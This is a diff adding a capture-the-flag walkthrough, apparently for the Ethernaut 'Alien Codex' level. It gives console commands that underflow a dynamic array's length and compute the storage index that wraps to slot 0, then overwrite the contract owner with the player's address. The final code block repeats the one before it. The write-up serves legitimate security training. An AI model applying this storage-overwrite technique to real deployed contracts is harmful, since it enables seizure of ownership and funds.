@@ -233,3 +233,35 @@ solverAddr = txn.contractAddress
 ```
 await contract.setSolver(solverAddr)
 ```
+## Alien Codex
+
+First step to solve this level is to pass the check call the make_contact function and then modify the length of the codex 
+```
+await contract.make_contact()
+await contract.retract()
+
+```
+Caclualte the postion storage of the start of codex array 
+```
+p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))
+
+```
+Caclualte the require index 
+```
+i = BigInt(2 ** 256) - BigInt(p)
+```
+
+Slice of the zeros 
+```
+content = '0x' + '0'.repeat(24) + player.slice(2)
+```
+
+Now revise alter sotrage slot 
+```
+await contract.revise(i, content)
+```
+then hijack alien codex 
+
+```
+await contract.revise(i, content)
+```
